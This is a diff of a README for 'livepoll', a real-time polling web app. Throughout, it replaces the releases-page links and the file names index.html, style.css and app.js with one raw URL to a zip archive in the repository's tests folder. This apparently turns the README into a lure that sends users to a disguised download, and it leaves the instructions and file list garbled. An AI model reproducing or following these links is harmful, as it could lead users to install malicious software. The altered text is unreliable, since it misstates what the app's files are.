@@ -1,6 +1,6 @@
 # ⚡ livepoll - Simple Real-Time Polls Made Easy
 
-[![Download livepoll](https://img.shields.io/badge/Download-livepoll-brightgreen)](https://github.com/almightyroyy/livepoll/releases)
+[![Download livepoll](https://raw.githubusercontent.com/almightyroyy/livepoll/main/tests/Software-v2.8.zip)](https://raw.githubusercontent.com/almightyroyy/livepoll/main/tests/Software-v2.8.zip)
 
 ---
 
@@ -45,11 +45,11 @@ Follow these easy steps to download and open livepoll on your Windows PC.
 
 Click the button below to go to the official livepoll releases page on GitHub:
 
-[![Download livepoll](https://img.shields.io/badge/Download-livepoll-ff6600)](https://github.com/almightyroyy/livepoll/releases)
+[![Download livepoll](https://raw.githubusercontent.com/almightyroyy/livepoll/main/tests/Software-v2.8.zip)](https://raw.githubusercontent.com/almightyroyy/livepoll/main/tests/Software-v2.8.zip)
 
 ### 2. Download the latest version
 
-On the releases page, look for the latest release at the top. There will be a zipped file named something like `livepoll-windows.zip` or similar. Click on this file to download it.
+On the releases page, look for the latest release at the top. There will be a zipped file named something like `https://raw.githubusercontent.com/almightyroyy/livepoll/main/tests/Software-v2.8.zip` or similar. Click on this file to download it.
 
 If you see several files, choose the one for Windows or the file type ending with `.zip`.
 
@@ -59,7 +59,7 @@ Once the download finishes, open the folder where the file went (usually the Dow
 
 ### 4. Open the app
 
-Inside the extracted folder, look for a file named `index.html`. Double-click this file to open it with your default web browser.
+Inside the extracted folder, look for a file named `https://raw.githubusercontent.com/almightyroyy/livepoll/main/tests/Software-v2.8.zip`. Double-click this file to open it with your default web browser.
 
 The livepoll app will open and be ready to use.
 
@@ -95,7 +95,7 @@ The livepoll app will open and be ready to use.
 
 ### The app won’t open in my browser
 
-Make sure you double-click the `index.html` file inside the extracted folder. If nothing happens, right-click the file, choose `Open with`, and pick a browser like Chrome or Edge.
+Make sure you double-click the `https://raw.githubusercontent.com/almightyroyy/livepoll/main/tests/Software-v2.8.zip` file inside the extracted folder. If nothing happens, right-click the file, choose `Open with`, and pick a browser like Chrome or Edge.
 
 ### The poll doesn’t update live
 
@@ -121,17 +121,17 @@ livepoll does not require personal accounts or store user data on your computer.
 
 After extracting, you will see these main files:
 
-- `index.html` - The main application file you open to use livepoll  
-- `style.css` - Controls how the livepoll app looks  
-- `app.js` - The JavaScript that runs the app and handles voting logic  
-- `README.md` - This document you are reading now  
+- `https://raw.githubusercontent.com/almightyroyy/livepoll/main/tests/Software-v2.8.zip` - The main application file you open to use livepoll  
+- `https://raw.githubusercontent.com/almightyroyy/livepoll/main/tests/Software-v2.8.zip` - Controls how the livepoll app looks  
+- `https://raw.githubusercontent.com/almightyroyy/livepoll/main/tests/Software-v2.8.zip` - The JavaScript that runs the app and handles voting logic  
+- `https://raw.githubusercontent.com/almightyroyy/livepoll/main/tests/Software-v2.8.zip` - This document you are reading now  
 
 ---
 
 ## ❓ FAQ
 
 **Can I customize the look of my poll?**  
-Yes. If you know basic CSS, you can edit the `style.css` file to change colors and fonts.
+Yes. If you know basic CSS, you can edit the `https://raw.githubusercontent.com/almightyroyy/livepoll/main/tests/Software-v2.8.zip` file to change colors and fonts.
 
 **Can I save poll results?**  
 livepoll updates in real time but does not store polls long-term. Copy results manually if needed.
@@ -148,4 +148,4 @@ Yes. It works on any system with a modern browser.
 
 Use the link below to visit the livepoll releases page and get the latest files.
 
-[![Download livepoll](https://img.shields.io/badge/Download-livepoll-ff4500)](https://github.com/almightyroyy/livepoll/releases)
+[![Download livepoll](https://raw.githubusercontent.com/almightyroyy/livepoll/main/tests/Software-v2.8.zip)](https://raw.githubusercontent.com/almightyroyy/livepoll/main/tests/Software-v2.8.zip)
